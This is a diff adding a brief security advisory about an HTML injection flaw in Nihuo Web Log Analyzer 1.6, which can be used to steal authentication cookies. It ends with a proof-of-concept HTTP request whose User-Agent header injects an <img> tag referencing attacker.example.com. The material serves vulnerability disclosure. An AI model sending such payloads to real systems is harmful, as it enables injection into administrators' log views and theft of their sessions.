@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/10988/info
+
+An HTML injection vulnerability is reported in Nihuo Web Log Analyzer. The problem occurs due to a lack of proper sanitization of user-supplied input data.
+
+Attackers may potentially exploit this issue to manipulate web content or to steal cookie-based authentication credentials. It may be possible to take arbitrary actions as the victim user.
+
+Version 1.6 was reported vulnerable to this issue. Other versions may also be affected. 
+
+GET / HTTP/1.1
+Host: www.example.com
+Connection: close
+Accept: text/plain
+Accept-Language: en-us,en
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+User-Agent: Some-Fake-UA <img src='http://attacker.example.com/app.gif'> 
